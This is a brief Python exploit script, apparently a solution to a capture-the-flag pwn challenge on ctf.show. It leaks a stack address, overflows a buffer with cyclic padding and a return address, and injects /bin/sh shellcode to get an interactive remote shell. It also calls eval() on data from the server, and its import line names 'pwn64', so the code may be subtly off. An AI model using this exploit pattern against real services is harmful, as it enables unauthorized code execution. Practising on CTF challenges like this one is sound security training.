from pwn64 import *
context(arch="amd64",log_level="debug")
p = remote("pwn.challenge.ctf.show",28255)
p.recvuntil("What's this : [")
shellcode_area = eval(p.recvuntil(b"]", drop=True))
offset = 0x10 + 8
print(hex(shellcode_area))
shellcode = asm(shellcraft.sh())
payload = flat([cyclic(offset), shellcode_area + offset +8, shellcode])
p.sendline(payload)
p.interactive()